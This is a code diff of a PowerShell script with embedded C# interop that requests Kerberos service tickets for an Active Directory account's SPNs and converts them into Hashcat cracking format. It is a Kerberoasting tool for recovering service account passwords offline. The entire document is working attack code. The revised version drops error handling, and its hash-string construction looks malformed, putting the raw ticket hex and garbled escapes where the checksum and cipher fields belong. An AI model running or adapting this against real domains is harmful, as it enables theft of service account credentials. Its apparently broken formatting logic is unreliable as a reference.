@@ -1,3 +1,6 @@
+# PowerShell script to retrieve Kerberos TGS tickets for a given SamAccountName
+# and convert them into Hashcat-compatible format by detecting the encryption type
+
 Add-Type @"
 using System;
 using System.Runtime.InteropServices;
@@ -33,9 +36,6 @@ public class K {
     [DllImport("secur32.dll", SetLastError = true)]
     public static extern int FreeCredentialsHandle(IntPtr phCredential);
 
-    [DllImport("secur32.dll", SetLastError = true)]
-    public static extern int FreeContextBuffer(IntPtr pvContextBuffer);
-
     [StructLayout(LayoutKind.Sequential)]
     public struct SecBuffer {
         public uint cbBuffer;
@@ -57,115 +57,80 @@ public class K {
         IntPtr expiry2 = IntPtr.Zero;
         uint attr = 0;
 
-        try {
-            SecBuffer secBuf = new SecBuffer();
-            secBuf.BufferType = 2; // SECBUFFER_TOKEN
-            secBuf.cbBuffer = 12288;
-            secBuf.pvBuffer = Marshal.AllocHGlobal((int)secBuf.cbBuffer);
+        SecBuffer secBuf = new SecBuffer();
+        secBuf.BufferType = 2;
+        secBuf.cbBuffer = 12288;
+        secBuf.pvBuffer = Marshal.AllocHGlobal((int)secBuf.cbBuffer);
 
-            IntPtr pSecBuf = Marshal.AllocHGlobal(Marshal.SizeOf(secBuf));
-            Marshal.StructureToPtr(secBuf, pSecBuf, false);
+        IntPtr pSecBuf = Marshal.AllocHGlobal(Marshal.SizeOf(secBuf));
+        Marshal.StructureToPtr(secBuf, pSecBuf, false);
 
-            SecBufferDesc desc = new SecBufferDesc();
-            desc.ulVersion = 0;
-            desc.cBuffers = 1;
-            desc.pBuffers = pSecBuf;
+        SecBufferDesc desc = new SecBufferDesc();
+        desc.ulVersion = 0;
+        desc.cBuffers = 1;
+        desc.pBuffers = pSecBuf;
 
-            if (AcquireCredentialsHandle(
-                    null,
-                    "Kerberos",
-                    0x00000002,
-                    IntPtr.Zero,
-                    IntPtr.Zero,
-                    IntPtr.Zero,
-                    IntPtr.Zero,
-                    out cred,
-                    out expiry1) != 0)
-                return null;
+        if (AcquireCredentialsHandle(null, "Kerberos", 2, IntPtr.Zero, IntPtr.Zero, IntPtr.Zero, IntPtr.Zero, out cred, out expiry1) != 0)
+            return null;
 
-            if (InitializeSecurityContext(
-                    ref cred,
-                    IntPtr.Zero,
-                    spn,
-                    0x00001000,
-                    0,
-                    16,
-                    IntPtr.Zero,
-                    0,
-                    out ctx,
-                    ref desc,
-                    out attr,
-                    out expiry2) != 0)
-                return null;
+        if (InitializeSecurityContext(ref cred, IntPtr.Zero, spn, 0x00001000, 0, 16, IntPtr.Zero, 0, out ctx, ref desc, out attr, out expiry2) != 0)
+            return null;
 
-            SecBuffer resultBuf = (SecBuffer)Marshal.PtrToStructure(pSecBuf, typeof(SecBuffer));
-            if (resultBuf.cbBuffer == 0 || resultBuf.pvBuffer == IntPtr.Zero)
-                return null;
+        SecBuffer resultBuf = (SecBuffer)Marshal.PtrToStructure(pSecBuf, typeof(SecBuffer));
+        byte[] data = new byte[resultBuf.cbBuffer];
+        Marshal.Copy(resultBuf.pvBuffer, data, 0, data.Length);
 
-            byte[] data = new byte[resultBuf.cbBuffer];
-            Marshal.Copy(resultBuf.pvBuffer, data, 0, data.Length);
-
-            return data;
-        } finally {
-            if (cred != IntPtr.Zero) FreeCredentialsHandle(cred);
-        }
+        FreeCredentialsHandle(cred);
+        Marshal.FreeHGlobal(secBuf.pvBuffer);
+        Marshal.FreeHGlobal(pSecBuf);
+        return data;
     }
 }
 "@
 
 function Get-KerberosTicketHashcatFormat {
-    param (
+    param(
         [Parameter(Mandatory)]
         [string]$SamAccountName
     )
 
-    try {
-        $user = Get-ADUser -Filter "samaccountname -eq '$SamAccountName'" -Properties servicePrincipalName
-        if (-not $user) {
-            Write-Error "User '$SamAccountName' not found in Active Directory."
-            return
+    $user = Get-ADUser -Filter "samaccountname -eq '$SamAccountName'" -Properties servicePrincipalName
+    if (-not $user) {
+        Write-Error "User '$SamAccountName' not found."
+        return
+    }
+
+    foreach ($spn in $user.servicePrincipalName) {
+        Write-Host "[+] Requesting TGS for SPN: $spn"
+        $rawBytes = [K]::GetRawTicket($spn)
+        if (-not $rawBytes) {
+            Write-Warning "[-] Failed to retrieve ticket for $spn"
+            continue
         }
 
-        if (-not $user.servicePrincipalName) {
-            Write-Warning "No SPNs found for '$SamAccountName'."
-            return
-        }
+        $ticketHex = [System.BitConverter]::ToString($rawBytes).Replace("-", "")
 
-        foreach ($spn in $user.servicePrincipalName) {
-            Write-Host "[+] Requesting TGS for SPN: $spn"
-
-            try {
-                $ticketBytes = [K]::GetRawTicket($spn)
-                if (-not $ticketBytes) {
-                    Write-Warning "No ticket retrieved for $spn"
-                    continue
-                }
-
-                # Convert to hex string
-                $ticketHex = -join ($ticketBytes | ForEach-Object { $_.ToString("x2") })
-
-                # Find the checksum and cipher portions
-                $rc4Indicator = "1122000000000000"
-                $splitIndex = $ticketHex.IndexOf($rc4Indicator)
-                if ($splitIndex -eq -1) {
-                    Write-Warning "RC4 checksum pattern not found in ticket for $spn"
-                    continue
-                }
-
-                $checksumHex = $ticketHex.Substring($splitIndex + $rc4Indicator.Length, 32)
-                $cipherHex = $ticketHex.Substring($splitIndex + $rc4Indicator.Length + 32)
-
-                # Build hashcat format string
-                $realm = "$env:USERDOMAIN"
-                $spnSanitized = $spn.Replace(":", "~")
-                $hashcat = "\$krb5tgs\$23\$*${SamAccountName}*${realm}*${spnSanitized}*${checksumHex}*${cipherHex}"
-
-                Write-Host "[+] Hashcat Format:`n${hashcat}"
-            } catch {
-                Write-Warning "Error while processing SPN '${spn}': $_"
+        # Detect encryption type
+        $etype = $null
+        if ($ticketHex -match "(?<=a382)(..)(..)" ) {
+            $etypeBytes = $matches[1] + $matches[2]
+            switch ($etypeBytes) {
+                "1703" { $etype = 17 }
+                "1803" { $etype = 18 }
+                "2303" { $etype = 23 }
             }
         }
-    } catch {
-        Write-Error "Active Directory query failed: $_"
+
+        if (-not $etype) {
+            Write-Warning "[-] Could not determine encryption type for $spn"
+            continue
+        }
+
+        $userPart = $SamAccountName
+        $realm = ($env:USERDNSDOMAIN -replace '\\', '').ToLower()
+        $spnSanitized = $spn.ToLower().Replace("/", "~").Replace(":", "-")
+
+        $hashcatFormat = "$krb5tgs$$etype`*$userPart`$$realm`$$spnSanitized`$$ticketHex"
+        Write-Host "[+] Hashcat Format:\n$hashcatFormat"
     }
 }
